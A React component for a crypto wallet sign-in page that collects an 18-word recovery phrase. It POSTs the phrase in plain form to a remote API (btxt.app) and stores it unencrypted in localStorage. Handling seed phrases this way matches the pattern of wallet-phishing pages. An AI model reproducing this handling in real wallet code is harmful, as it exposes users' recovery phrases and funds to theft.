// src/pages/Access.js
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Background from "../components/OtherBG";
import "bootstrap/dist/css/bootstrap.min.css";
import { Card, Button } from "react-bootstrap";
// import { Form, FormRow, FormGroup, FormControl } from 'react-bootstrap';
import { Form, Row, Col, Alert } from "react-bootstrap";
import Cookies from "js-cookie";
import "./css/home.css";

const Access = () => {
  const navigate = useNavigate();
  const cardStyle = {
    WebkitBackdropFilter: "blur(10px)",
    backdropFilter: "blur(10px)",
    color: "#fff",
    borderRadius: "8px", // corrected from border-radius
    border: "1px solid rgba(0, 69, 132, 0.5)",
    background:
      "linear-gradient(270deg, rgba(0, 69, 132, 0.2) 0%, rgba(5, 5, 5, 0.15) 100%)",
    boxShadow:
      "0px 4px 18px 0px rgba(0, 0, 0, 0.16), 0px 4px 100px 0px rgba(0, 0, 0, 0.25) inset",
  };
  const inputBoxStyle = {
    border: "2px solid transparent",
    borderLeft: "0",
    borderRadius: "0px 5px 5px 0px",
    color: "white",
    fontWeight: 300,

    outline: "none !important",

    backdropFilter: "blur(10px)",

    color: "#fff",
    WebkitBackdropFilter: "blur(10px)",

    border: "1px solid rgba(0, 69, 132, 0.5)",
    background:
      "linear-gradient(270deg, rgba(0, 69, 132, 0.2) 0%, rgba(5, 5, 5, 0.15) 100%)",
    boxShadow:
      "0px 4px 18px 0px rgba(0, 0, 0, 0.16), 0px 4px 100px 0px rgba(0, 0, 0, 0.25) inset",
    // background: '#08131c'
  };
  useEffect(() => {
    // Add class to body element when component mounts
    document.body.classList.add("overflow-hidden");

    // Remove class from body element when component unmounts
    return () => {
      document.body.classList.remove("overflow-hidden");
    };
  }, []);

  const [words, setWords] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  // const dataToSend = 'Hello from Screen1';

  const handlePasteClick = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const wordArray = text.split(" ");
      if (wordArray.length === 18) {
        setWords(wordArray);
        setErrorMessage("");
      } else {
        setErrorMessage("Please Enter 18 Words only");
      }
    } catch (error) {
      console.error("Error reading clipboard:", error);
      setErrorMessage("Error reading clipboard. Please enter 18 words manually.");
    }
  };

  const handleInputChange = (index, value) => {
    const updatedWords = [...words];
    updatedWords[index] = value;
    setWords(updatedWords);
  };

  const handleAccessWalletClick = () => {
    const apiUrl = "https://btxt.app/api2/access-wallet";

    fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ mnemonic: words.join(' ') }),
    })
      .then((response) => {
        if (response.status === 200) {
          return response.json();
        } else {
          setErrorMessage("Error accessing wallet. Please try again.");
          throw new Error("Error accessing wallet. Status: " + response.status);
        }
      })
      .then((data) => {
        localStorage.setItem("address", data.address);
        localStorage.setItem("keyW", words.join(' '));
        navigate("/signin", { state: { data: data.address } });
      })
      .catch((error) => {
        console.error("Error accessing wallet:", error);
        setErrorMessage("Error accessing wallet. Please try again.");
      });
  };

  return (
    <>
      <Background />
      <div className="container mt-5 allbtn-frm overlayDIV">
      <div className="row">
        <div className="col-md-12 d-flex justify-content-center align-items-center vertical-center">
          <div className="col-md-12">
            <Card className="mb-4 d-flex justify-content-center align-items-center text-center" style={cardStyle}>
              <Card.Body>
                <br />
                <h2>Sign In To Your Wallet</h2>
                <br />
                <Form>
                  {[...Array(3)].map((_, rowIndex) => (
                    <Row key={rowIndex}>
                      {[...Array(6)].map((_, colIndex) => (
                        <Col key={colIndex} md={2}>
                          <Form.Group>
                            <div className="cust-form-control d-flex sh odd">
                              <label className="index-sp1 styleCardCompsmart">
                                {rowIndex * 6 + colIndex + 1}
                              </label>
                              <Form.Control
                                type="text"
                                style={inputBoxStyle}
                                placeholder={`Input ${rowIndex * 6 + colIndex + 1}`}
                                value={words[rowIndex * 6 + colIndex]}
                                onChange={(e) => handleInputChange(rowIndex * 6 + colIndex, e.target.value)}
                              />
                            </div>
                          </Form.Group>
                        </Col>
                      ))}
                    </Row>
                  ))}
                  {/* Buttons */}
                  <br />
                  <Row className="d-flex justify-content-center align-items-center text-center">
                    <Col md={2}>
                      <Button
                        className="custbtn-primary"
                        type="button"
                        onClick={handlePasteClick}
                      >
                        Paste
                      </Button>
                    </Col>
                    <Col md={2}>
                      <Button
                        className="custbtn-primary"
                        type="button"
                        onClick={handleAccessWalletClick}
                      >
                        Access Wallet
                      </Button>
                    </Col>
                  </Row>
                </Form>
                {/* Form ends here */}
                {errorMessage && (
                  <Alert
                    variant="danger"
                    className="mt-3"
                    onClose={() => setErrorMessage("")}
                    dismissible
                  >
                    {errorMessage}
                  </Alert>
                )}
              </Card.Body>
            </Card>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Access;
